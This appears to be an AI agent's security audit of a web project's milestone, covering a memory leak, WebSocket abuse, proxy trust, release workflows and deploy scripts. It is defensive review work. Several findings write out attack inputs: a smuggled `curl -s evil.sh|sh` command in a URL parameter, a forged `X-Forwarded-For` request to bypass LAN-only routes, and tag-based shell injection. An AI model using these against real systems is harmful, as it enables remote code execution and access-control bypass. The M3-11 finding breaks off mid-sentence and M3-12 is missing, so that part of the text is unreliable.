# M3 audit: the reconnect version, landing, the witness board, and the release and deploy surface

An independent audit of milestone M3 (PLAN §19.2), by an agent that did not write the code. It applies the review
rubric (§19.2.2), the severity scale (§19.2.3) and the crash-zone rules of D15, reads the vendored odin-http diff line
by line (D11), and reads the release and deploy surface M3 adds (the distroless Dockerfile, `deploy/compose.yaml`,
`deploy/Caddyfile`, `deploy/promote.ps1`, `release.yml` and CI's new jobs) for least privilege, injection, secrets,
host routing, trusted-proxy configuration, rollback and tag discipline.

**Method.** Read-only. A CPU-sensitive performance gate was running on the same machine, so nothing was built,
checked, tested or run: no `odin build/check/test`, no `build.sh`, no server, no node or Playwright, no k6, no
Docker. Every finding comes from reading the source at `c490e2a` (HEAD when the read began; HEAD has since moved to
`7165d59`, which adds only `TODO.md`, so the code is the same). The one untracked file in the tree, a perf CSV, was not
read. Where a finding rests on the toolchain's own code (core:net's resolver), that code was read at the installed
Odin. Where reading could not settle a point the finding says "suspected" and names what would confirm it. Site
values (the host's LAN address, its SSH alias, its directories, its hardware) are not in this report:
`deploy/promote.local.psd1` and `docs/private/` were not opened, and placeholders such as `<APOLLO_LAN_IP>` stand in.
Line numbers are at `c490e2a`.

**Result.** 0 CRITICAL, 1 HIGH, 2 MEDIUM, 6 LOW, 3 NIT. M3 cannot exit until M3-01 is fixed (§19.2.1: exit needs 0
open CRITICAL or HIGH). M3-01 is not reachable by a request: it is rated HIGH because, as `deploy/compose.yaml`
configures the lab, it ends every one of that container's loops in normal operation, with nothing asked of it. Of the
six M2 findings that M2's report says M3 closed (M2-18, M2-21, M2-31, M2-33, M2-35, M2-36), the code bears out all
six; M2-31's fix opens M3-02.

### M3-01 · HIGH · the witness board's watcher leaks every probe, and the lab is OOM-killed

**Where.** `features/status/status.odin`. `init` (`:56-60`) starts `watch` on a thread of its own when `STATUS_PROBES`
names any externals; `deploy/compose.yaml:108` names three for the lab. `watch` (`:87-101`) loops forever: for each
external, `probe`, then `time.sleep(WATCH_EVERY)` (10 s). `probe` (`:103-127`) builds its request with `fmt.tprintf`
(`:112`), and before that resolves the host with `net.resolve_ip4` (`:105`), which on Linux is
`get_dns_records_from_os(hostname, .IP4, context.temp_allocator)` (core:net `dns.odin:114`): `_get_dns_records_os`
(`dns_unix.odin:24-25`) sets `context.allocator` to that temp allocator and reads and parses `/etc/resolv.conf` and
`/etc/hosts`, clones names and builds the query and the records in it. The thread's temp allocator is the runtime's
default, a growing arena whose `delete`s do nothing, and nothing on this thread ever calls `free_all` on it. The
messages `probe` returns are heap-allocated and freed a round later (`:92`); everything in the temp arena is kept for
good.

**Scenario.** No request is needed. The lab as deployed probes three witnesses every 10 s, 25,920 probes a day. Each
leaks the request line (about 80 bytes) plus whatever the resolver read and built (the two files, the parsed lines,
the DNS query and answer, the record names): on a Docker network's small files, on the order of a kilobyte or more,
so tens of megabytes a day. The lab runs with `mem_limit: 64m` (`compose.yaml:45`); the kernel OOM-kills it when the
arena pushes RSS past that, every loop at once, mid-stream for whoever has the lab's SSE, WebSocket and multipart
pages open, and `restart: unless-stopped` brings it back to leak again. The leak itself is certain from reading; the
rate is suspected (the resolver's allocations depend on the files). Confirm with `docker stats` on the lab container
over a few hours on the stack (or with `WATCH_EVERY` at 100 ms in a local build): its memory climbs in a straight line,
and `docker inspect -f '{{.State.OOMKilled}} {{.RestartCount}}'` shows the kills. No test runs long enough to see it:
`stack-test.sh` reads the board within 15 s, and CI's `docker` job sets no probes.

**Fix.** `defer free_all(context.temp_allocator)` at the end of each round in `watch` (the messages already live on
the heap, and `board` copies under the lock). Better still, give the thread its own small arena and reset it per
probe. A unit test that runs `probe` against a closed local port a few hundred times under a `Tracking_Allocator` set
as the temp allocator catches a regression.

### M3-02 · MEDIUM · every frame carrying `ver` buys a snapshot render

**Where.** `features/chat/transport_ws/ws.odin:100-113`: `on_message` answers any text frame whose object has a
non-empty `ver` field with `catch_up` (`:74-92`), which reads `chat.changed` (or, when the room let some of it go,
`chat.recent`) and renders it with `chat_views.snapshot` within `stream.backlog_budget()` (half of
`STREAM_MAX_QUEUED`, 128 KiB). `snapshot` (`views.odin:208-216`) renders the whole list, measures it, drops a quarter
and renders again until it fits. Nothing limits how often a socket may ask: the page sends `ver` once per connect, but
the server takes it on any frame. Chat's `posts` limit (5 per 10 s) is only on `body`; the socket's `MAX_RATE`
(`:30`) is 20 frames a second.

**Scenario.** A member on the LAN opens the room's socket and sends `{"ver":"1"}` 19 times a second. In a room whose
ring holds 100 long messages (`KEEP`, `store.odin:31`; a message renders to about 10.6 KB, M2-03), `changed` from 1
returns all 100 when nothing was let go, and `snapshot` renders about 1.06 MB, then 0.8, 0.6, … down to the dozen
that fit in 128 KiB: roughly 4 MB of escaping per frame, with the chat store's lock held while `changed` copies 100
messages. With `STREAMS_PER_USER` (8) sockets that is about 150 catch-ups a second from one member; the witnesses run
`THREADS: "1"`, so one loop does all of it, and every other request and stream on the streams witness waits behind
it. If the member doesn't read, the queue cap closes the socket after two answers (1013), and the next 20 connects a
minute give 40 more; reading, as a LAN client easily can at 2.5 MB/s a socket, keeps it going. Before M3 the same
render ran once per connect, which admission bounds at 20 a minute; the fix for M2-31 moved it to a frame.

**Fix.** Answer `ver` once per socket: a flag on `Socket`, set by the first catch-up, after which a `ver` frame is
ignored (or treated as a malformed post). Independently, `snapshot` could measure each message once and pick the
newest that fit before rendering, instead of rendering the list up to log₄⁄₃ times. A `chat.spec` case: a second
`ver` frame on one socket gets no answer.

### M3-03 · MEDIUM · the trusted proxy is the stack network's gateway, which more than NPM arrives from

**Where.** `deploy/Caddyfile:11-13` trusts `X-Forwarded-For` from `172.31.120.1/32`, the gateway of the stack's
network, with `trusted_proxies_strict`; every app trusts the Caddy's `X-Real-IP` (`compose.yaml:54`,
`TRUST_PROXY: 172.31.120.10/32`) and serves `.Lan_Only` routes, `lan_only` topics and per-client limits by it
(`LAN_CIDRS: 192.168.0.0/16`, `:55`; `platform/web/front.odin:226-234`). The Caddy publishes `"8120:80"` on every host
address (`compose.yaml:64`). The Caddyfile's own comment (X39) is that NPM's traffic reaches the Caddy from the
gateway because Docker masquerades it there, and `stack-test.sh`'s "trusted chain" check relies on the same thing:
a `curl` on the test machine to `127.0.0.1:8120` arrives from the gateway, and its `X-Forwarded-For: 192.168.5.5` is
believed.

**Scenario.** The gateway is not NPM; it is the source of every connection Docker masquerades or proxies into the
network. That includes every process on the host and every other container on it that connects to the host's address
on 8120 (any compose project on the same machine), and, suspected, every IPv6 client: the stack network is IPv4-only,
so Docker answers the published port on `[::]:8120` with its userland proxy, which connects into the network from the
gateway. Any of these sends `X-Forwarded-For: 192.168.5.5` and is, to the app, a LAN client at an address of its
choosing: it passes `.Lan_Only` (chat's nickname login and rooms on the streams witness), a `lan_only` topic, and, by
choosing a fresh address per request, every per-client limit (admission's `STREAMS_PER_CLIENT` and
`STREAM_CONNECTS`, `MAX_CLIENTS`, the bot's guest limit, the lab's publish limit). Over IPv6 that is any LAN host,
and the internet too if the router admits inbound IPv6 to the host. `ACCOUNTS_NICK_ADMIN_CIDRS` is unset in the
stack, so no address makes an admin today; a deploy that sets it would hand admin to the same callers. Confirm on the
host: `ss -ltnp 'sport = :8120'` (a `docker-proxy` bound to `[::]` is the IPv6 path), then from another LAN machine
`curl -6 -H 'Host: starter-streams.alexh95.com' -H 'X-Forwarded-For: 192.168.5.5' 'http://[<APOLLO_LAN_IPV6>]:8120/login'`:
the nickname form, not the LAN notice, confirms it. The same request over IPv4 from that machine should show the LAN
notice only if that machine is off `LAN_CIDRS` (DNAT keeps its address, so it is not trusted).

**Fix.** Trust NPM by an address only NPM has: attach NPM's container to the stack network (or a small shared one)
at a pinned address, trust that address in the Caddyfile, and stop publishing 8120, or publish it on loopback only.
If the publish must stay, bind it to the IPv4 LAN address (`<APOLLO_LAN_IP>:8120:80`), which removes the IPv6 proxy
path, and record in X39 that host-local callers are trusted. `stack-test.sh` should then assert that a request with a
forged `X-Forwarded-For` from an untrusted source is not believed, rather than that one from the gateway is.

### M3-04 · LOW · the watcher is a bare thread under a plain mutex, with no connect timeout

**Where.** `features/status/status.odin`. `externals.mu` is a `sync.Mutex` (`:47-50`), taken by the watcher (`:90-94`)
and by `board` on a loop (`:146-150`); the watcher is `thread.create_and_start(watch, …)` (`:59`), not wrapped by
`guard.call`. CLAUDE.md and rubric 4 put every lock through `guard.lock`, and §19.2.1's `entry-points` check asks for
every thread callback to be wrapped or waived; `tools/check` has neither a `locks` nor an `entry-points` check yet,
so nothing caught it. `probe` resolves and dials with no timeout (`:105-108`; the README says so), and ignores
`net.set_option`'s result (`:110-111`, rubric 5).

**Scenario.** No crash path from input was found: the bytes `probe` parses come from the operator's own witnesses,
and its slicing is bounded (`:124`). But a trap in the watcher is a process exit with no recovery and no crash line,
and a trap in `board` while it holds the lock stalls the watcher for good. A witness whose container is paused, or a
probe name that resolves to an address that drops SYNs, holds the dial for the kernel's SYN retries (about two
minutes on Linux), and the board shows every external's last state, "ok" included, that long. If a timeout option
failed to set, a peer that accepts and never answers holds the watcher, and the board, forever.

**Fix.** `guard.Mutex` for `externals.mu`, `guard.call` around each round, and a bounded dial (nbio's connect with a
timeout, or a non-blocking connect and poll); log a failed `set_option` and count the probe down.

### M3-05 · LOW · the builder prints a refused name into the command it offers

**Where.** `features/landing/landing.odin:131`: `plan` writes `odin run tools/init -- <name>` with the name as typed,
even when `valid_name` refused it (`:122-124`); the problem is listed beside the command, but the command is still
shown in a `<pre>` meant for copying. `GET /landing/command` (`landing/web/web.odin:44-63`) is public and answers a
bare fragment on the starter's own origin. The name is cut to 40 bytes by byte (`:53`), not by rune as CLAUDE.md asks
of text cut from input (the cut text then fails `valid_name`, so only the echo is affected).

**Scenario.** A link to `/landing/command?name=x;curl+-s+evil.sh|sh` (20 bytes) shows, on the project's own domain,
`odin run tools/init -- x;curl -s evil.sh|sh` with a note that the name is wrong. Escaping is correct (no markup
escapes), so this is a copy-paste lure, not an injection into the page.

**Fix.** Print `<name>` in the command whenever `valid_name` refuses it; cut by rune.

### M3-06 · LOW · the release publishes any `v*` tag, with no gate and no smoke of what it pushed

**Where.** `.github/workflows/release.yml`. The trigger is `tags: ['v*']` (`:15-16`); the header asks that a tag be
put on a commit CI passed, but nothing checks it. On a tag, the `Smoke (dry run)` step is skipped (`:79-92`: it runs
only when `PUBLISH != 'true'`), so the images pushed by digest are never started by this workflow. A pre-release is a
version with a `-` (`:154`), so `v2.2.0rc1` would publish as a final release. `VERSION` is the tag name
(`:53-56`), passed as `--build-arg VERSION="$VERSION"` and expanded unquoted in the Dockerfile's
`RUN VERSION=${VERSION} sh build.sh …` (`Dockerfile:79`): git allows `;`, `|` and `$` in a ref name, so a tag can run
a command in the build stage (which holds no secret; only someone who can push tags can do it). `docker login` takes
`${{ secrets.GITHUB_TOKEN }}` by template expansion into the script (`:59`, `:117`) rather than through `env`; the
value is masked, but an expression in a `run:` body is the pattern GitHub's hardening guide warns against. First-party
actions are pinned by major tag (`actions/checkout@v7`, `upload-artifact@v7`, `download-artifact@v8`) in jobs that hold
`packages: write` and `id-token: write`; the third-party ones are SHA-pinned as the comment says.

What holds: the workflow's default is `contents: read`; `image` and `merge` add only `packages: write` (and `merge`
the `id-token`/`attestations` pair the attestation needs); `github-release` alone has `contents: write`; `deploy-fly`
inherits `contents: read` and gets `FLY_API_TOKEN` through `env`. The manifest list is tagged `vX.Y.Z` and
`sha-<7>` only (`:120-121`): **no `latest` is ever pushed**. A workflow_dispatch run is a dry run that pushes nothing.

**Fix.** Validate the tag at the top of `image` (`^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$`), require the commit's CI
run to have passed (`gh api repos/…/commits/$GITHUB_SHA/check-runs`), run the smoke on the pushed digest in `merge`,
quote `"${VERSION}"` in the Dockerfile, and pass the token through `env`.

### M3-07 · LOW · the stack keeps default capabilities, and its network reaches the LAN

**Where.** `deploy/compose.yaml`. The apps' anchor (`:12-38`) sets a non-root user, a read-only root, a tmpfs, the
seccomp profile, `init`, limits and log rotation, which is most of §20.4's hardening, but not `cap_drop: [ALL]` or
`security_opt: no-new-privileges:true`. The Caddy (`:58-75`) runs as the image's root, with Docker's default seccomp
and capabilities, no `read_only`, no memory or CPU limit. The `stack` network (`:110-117`) is not `internal`, so a
witness can open connections to the LAN and the internet.

**Scenario.** None from the app as read. These matter after a compromise: a witness has no reason to hold `NET_RAW`
or to reach the LAN, and the Caddy is the one container that parses every request first. The seccomp profile's
`io_uring_*` allowance is Docker's default plus those three calls (`docker/seccomp-io-uring.json:63-67`); io_uring
submissions are not filtered by seccomp, a known cost of the allowance that the image's comment already names.

**Fix.** Add `cap_drop: [ALL]` and `no-new-privileges:true` to the anchor (the apps bind 8080, so they need no
capability) and to the Caddy with `cap_add: [NET_BIND_SERVICE]`; give the Caddy `read_only` with its `/data` and
`/config` volumes, and a memory limit; put the apps on an `internal: true` network shared with the Caddy, which keeps
the published one.

### M3-08 · LOW · `promote.ps1` accepts a mutable tag and trusts the host's `.env` in its rollback

**Where.** `deploy/promote.ps1`.
- `-Tag` must match `^v\d+\.\d+\.\d+$|^[a-z0-9][a-z0-9._-]*$` (`:108`); the second branch, there for rc and local
  tags, admits `latest` (and, PowerShell's `-match` being case-insensitive, `LATEST`). `.env.example` says a deploy
  pins "a release's vX.Y.Z, never `latest`"; a promote to `latest` makes `$was` meaningless for the next rollback.
- The previous tags are read back from the host's `.env` (`:113-116`) and the rollback passes `$was` straight into
  the bash it sends (`Up`, `:189-190`: `sed -i 's|^$k=.*|$k=$tag|'` and `echo '$k=$tag'`), unchecked by the `-Tag`
  rule. A `.env` line edited by hand with a quote, a `|` or a comment breaks the rollback in the moment it is needed.
  Whoever can write that file can already run the stack, so this is robustness, not a privilege gain.
- The latent snapshot step (`:157-163`, empty until M4) runs `busybox` unpinned, as root, with the service's volumes,
  and discards its errors.
- `-Status` probes an unrelated service of the host by its port (`:102`), which names that service in a public file
  (§20's public-repo hygiene puts the host's services in `docs/private/`).

What holds, as asked: values built into shell are quoted where they can carry text (`Quote` for `.env` and
`deployed.json`; base64 for the staged files; `-Service` is a `ValidateSet`; `-Tag` admits only `[A-Za-z0-9._-]`);
SSH runs `BatchMode`; no secret passes through the script. **A failed smoke does roll back**: `Up` and `Smoke` run in
one `try` (`:210`), a failure of either restores `$was` in `.env`, recreates the service and smokes it again, then stops
before the next service (`:213-220`); the smoke goes through the stack Caddy and checks `x-version` against the tag,
so a stale container or a wrong image fails it. A first deploy has no `$was` and is not rolled back, which is right.
If the rollback's own `Up` throws, the script ends there without writing `deployed.json`; `.env` already names `$was`.

**Fix.** Allow only `^v\d+\.\d+\.\d+(-rc\.\d+)?$` with `-cmatch` (and `ci`-like tags only for `-Target local`); check
`$was` against the same rule before using it; pin busybox by digest (or use the distroless image's own `--backup`
with a retention flag); move the unrelated probe to the private config.

### M3-09 · LOW · `ws_field` has no fuzz case

**Where.** `platform/stream/ws.odin:39-228` replaces core:encoding/json with a hand reader of every client's WebSocket
text frame (chat's socket, the lab's room). Rubric 7 asks for a fuzz case with a new parser; there is none (no
libFuzzer target in the repo reaches it, and the nightly fuzzing is Autobahn's, which tests the frame codec, not the
JSON). The unit test (`stream_test.odin`, `ws_field_reads_hx_ws_and_refuses_deep_nesting`) is thorough for the cases it
names, and the reader as read is sound: recursion is bounded by `WS_JSON_DEPTH` through `json_reader_value`'s
`depth`, every index is checked before it is read, an escape is validated by `json_unescape` even when the value is
skipped, and a raw control byte is refused in a string (an escaped one too, through the unescape's default case).

**Fix.** A fuzz target for `ws_field` (any bytes in, no trap, and agreement with core:encoding/json's strict parse on
whether the frame is one object), with the unit test's frames as its seed corpus.

### M3-10 · NIT · `ws_field` clones every key

`ws_field`'s comment (`ws.odin:33-38`) says it reads "with no allocation but the value"; it reads every top-level key
with `keep = true` (`:46`), a clone into the temp allocator each. A 64 KiB frame of short keys makes a few thousand
small allocations, freed when `_stream_feed` frees the temp allocator, so it is bounded; read keys with `keep = false`
and compare the raw key when it holds no escape, or correct the comment.

### M3-11 · NIT · "reached after a restart" assumes the clock doesn't step back

The memory store's versions start from the boot's wall clock (`store.odin:59-61`, `s.base`), and a reconnect's version
is "reached" whenever the new process has let nothing go (`:135`). If the clock stepped back across a restart (an NTP
correction at boot), the new versions sit below the page's, and a socket's catch-up or SSE's resync returns nothing

#### M3-13 · LOW · the Caddy's hardening waits for a recreate nobody runs

**Where.** `promote.ps1:210` runs `up -d --no-recreate caddy`, by design ("never reloading the Caddy"); each app is
recreated by its own `up -d --no-deps`. `compose.yaml:66-70` adds `cap_drop`, `cap_add`, `no-new-privileges` and
`mem_limit` to the `caddy` service.

**Scenario.** On a host where the Caddy already runs (the lab's stack, since slice 9), a promote stages the new
`compose.yaml` and recreates the four apps, which get the dropped capabilities. The Caddy keeps the container it was
created with: root, Docker's default capabilities, no memory limit. `docker compose ps` doesn't show the drift, and
CI's `stack` job starts a fresh stack and passes. The Resolution's "held by CI's `stack` job" therefore holds for a new
stack only.

When the Caddy is next recreated (by hand, or after `docker compose down`), it runs without `DAC_OVERRIDE` and
`DAC_READ_SEARCH`. Promote writes the Caddyfile with `base64 -d > <dir>/Caddyfile` under the SSH session's umask, as
the host user. Under the usual 022 the file is 0644, readable through "other", and nothing changes. Under a 077 umask
it is 0600, owned by the host user; whether the host's shell sets that is suspected, not known. Root in the Caddy could
read such a file before and can't after. The recreated Caddy then fails to load its config, and every host behind it
answers nothing. No smoke in promote covers the Caddy. Confirm with `stat -c '%a %U' <dir>/Caddyfile` on the host and
`docker inspect -f '{{.HostConfig.CapDrop}}'` on the Caddy.

**Fix.** Say in the Resolution and the compose comment that the Caddy's settings take effect on its next recreate, and
recreate it once, deliberately (in a window, or with slice 10's NPM change, which touches it anyway). Write the staged
files with an explicit mode (`umask 022` at the top of the staged script, or `install -m 0644`).

#### M3-14 · NIT · the tag rule's `\d` and `$`

**Where.** `promote.ps1:111`. In .NET, `\d` matches any Unicode decimal digit (`v١.٢.٣` passes) and `$` matches before
a final newline (`"v2.2.0` + newline passes). The local rule's `$` behaves the same way.

**Scenario.** `-Tag` comes from the operator's command line, and the `.env` values arrive line-split with no newline in
them, so either case is a typo, not an attack. It would reach the staged bash (`sed -i 's|^K=.*|K=<tag>|'`) and the
image reference, and fail there instead of at the rule. The release's gate uses `grep -E` with `[0-9]`, which has
neither problem.

**Fix.** `[0-9]` for `\d` and `\z` for `$`, in both rules.

#### M3-15 · NIT · two stale `docs/catalog.json` lines in a project without `landing`

**Where.** `tools/init` drops the file and the Dockerfile's `COPY` of it, but not the Dockerfile's comment
(`Dockerfile:53-54`: "… and docs/catalog.json are what the build needs"). `.dockerignore`'s comment and its
`!docs/catalog.json` (`:2`, `:9`) stay too.

**Scenario.** None at build time: a negated pattern for a missing file is ignored. The project's own files describe a
file it doesn't have.

**Fix.** Add both to the landing-less branch's `edit` calls, or reword the Dockerfile comment so it doesn't name the
catalog.
